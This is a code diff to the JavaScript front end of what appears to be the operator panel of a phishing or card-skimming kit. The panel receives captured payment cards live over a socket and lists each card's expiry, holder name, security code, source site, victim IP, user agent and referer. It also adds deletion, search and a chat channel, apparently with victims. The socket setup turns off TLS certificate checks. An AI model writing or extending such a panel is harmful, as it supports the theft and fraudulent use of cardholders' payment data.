@@ -1,4 +1,7 @@
-const socket = io();
+const socket = io('https://localhost:3000', {
+    withCredentials: true,
+    rejectUnauthorized: false
+});
 const cardList = document.getElementById('card-list');
 const chatContainer = document.getElementById('chat-container');
 const chatMessages = document.getElementById('chat-messages');
@@ -12,6 +15,11 @@ const messageModal = document.getElementById('message-modal');
 const notificationText = document.getElementById('notification-text');
 const sendNotification = document.getElementById('send-notification');
 const cancelNotification = document.getElementById('cancel-notification');
+const cardsList = document.getElementById('cards-list');
+const closeChat = document.querySelector('.close-chat');
+const activeUsersCount = document.querySelector('.active-users .count');
+const soundButton = document.querySelector('.sound-btn');
+const logoutButton = document.querySelector('.logout-btn');
 
 let soundEnabled = true;
 let selectedCardId = null;
@@ -306,4 +314,110 @@ document.addEventListener('DOMContentLoaded', () => {
             chatContainer.style.display = 'block';
         }
     });
+});
+
+// Функция для создания строки таблицы с данными карты
+function createCardRow(card) {
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+        <td>${card.id}</td>
+        <td>${card.exp || '-'}</td>
+        <td>***</td>
+        <td>${card.name || '-'}</td>
+        <td>${card.code || '-'}</td>
+        <td>${card.site || '-'}</td>
+        <td>${card.ip || '-'}</td>
+        <td>${card.ua || '-'}</td>
+        <td>${card.referer || '-'}</td>
+        <td>
+            <button class="delete-btn">×</button>
+        </td>
+    `;
+    
+    // Обработчик для кнопки удаления
+    const deleteBtn = tr.querySelector('.delete-btn');
+    deleteBtn.addEventListener('click', () => {
+        socket.emit('delete-card', card.id);
+        tr.remove();
+    });
+    
+    return tr;
+}
+
+// Обработка полученных карт
+socket.on('cards', (cards) => {
+    cardsList.innerHTML = '';
+    cards.forEach(card => {
+        cardsList.appendChild(createCardRow(card));
+    });
+});
+
+// Обработка новой карты
+socket.on('new-card', (card) => {
+    cardsList.appendChild(createCardRow(card));
+});
+
+// Функционал чата
+function addChatMessage(message, isAdmin = false) {
+    const div = document.createElement('div');
+    div.className = `chat-message ${isAdmin ? 'admin' : 'user'}`;
+    div.textContent = message;
+    chatMessages.appendChild(div);
+    chatMessages.scrollTop = chatMessages.scrollHeight;
+}
+
+sendMessage.addEventListener('click', () => {
+    const message = chatInput.value.trim();
+    if (message) {
+        socket.emit('chat-message', message);
+        addChatMessage(message, true);
+        chatInput.value = '';
+    }
+});
+
+chatInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+        sendMessage.click();
+    }
+});
+
+socket.on('chat', (message) => {
+    addChatMessage(message, false);
+});
+
+// Открытие/закрытие чата
+document.querySelector('.action-item:last-child').addEventListener('click', (e) => {
+    e.preventDefault();
+    chatContainer.style.display = 'block';
+});
+
+closeChat.addEventListener('click', () => {
+    chatContainer.style.display = 'none';
+});
+
+// Поиск
+searchInput.addEventListener('input', (e) => {
+    const searchTerm = e.target.value.toLowerCase();
+    const rows = cardsList.getElementsByTagName('tr');
+    
+    Array.from(rows).forEach(row => {
+        const text = row.textContent.toLowerCase();
+        row.style.display = text.includes(searchTerm) ? '' : 'none';
+    });
+});
+
+// Звук
+soundButton.addEventListener('click', () => {
+    soundEnabled = !soundEnabled;
+    soundButton.textContent = soundEnabled ? 'Звук вкл.' : 'Звук выкл.';
+});
+
+// Выход
+logoutButton.addEventListener('click', () => {
+    window.location.href = '/logout';
+});
+
+// Оновление литератора активных пользователей
+socket.on('active-users', (count) => {
+    activeUsersCount.textContent = `${count} активных`;
 }); 
